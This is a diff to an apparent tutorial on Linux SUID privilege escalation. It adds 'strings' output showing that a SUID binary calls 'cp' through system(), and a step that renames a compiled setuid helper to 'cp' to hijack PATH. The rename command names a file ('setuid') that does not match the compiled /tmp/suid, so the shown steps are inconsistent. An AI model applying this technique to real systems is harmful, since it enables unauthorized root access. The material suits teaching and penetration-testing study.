@@ -35,6 +35,24 @@ bash-4.2$: ls /usr/bin/update_my_docs -alh
 ### Exploiting SUID
 
 Exploiting SUIDs binaries is very simple and there are two diffrent techniques to use it.
+Let's say we'd like to check what function our program use, so we'll use strings utility as following:
+
+```
+bash-4.2:/usr/bin$ strings update_my_docs
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+puts
+system
+__libc_start_main
+GLIBC_2.0
+PTRh0
+[^_]
+cp
+```
+
+In this example, we quickly identify the cp (copy) binary which executed as system (see the function name inside right?)
 
 #### Bash Function Manipulation
 
@@ -56,6 +74,7 @@ echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint 
 gcc -o /tmp/suid /tmp/suid.c  
 sudo chmod +x /tmp/suid # execute right
 sudo chmod +s /tmp/suid # setuid bit
+mv setuid cp # change name to the expected binary in our example
 ```
 
 Place it in our $PATH using the command:
